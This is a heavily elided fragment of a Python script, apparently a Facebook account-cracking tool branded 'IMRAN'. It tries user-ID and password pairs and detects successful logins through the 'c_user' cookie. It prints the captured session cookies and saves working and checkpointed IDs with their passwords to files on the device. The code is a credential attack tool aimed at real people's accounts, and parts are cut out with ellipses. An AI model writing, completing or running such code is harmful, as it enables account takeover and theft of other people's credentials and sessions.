...
def innocent():
    ...
    print('Ok Ids Saved in /IMRAN-OK.txt')
    print('Cp Ids Saved in /IMRAN-CP.txt')
    linex()
...
def mumitx(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[IMRAN-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/IMRAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[IMRAN-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/IMRAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
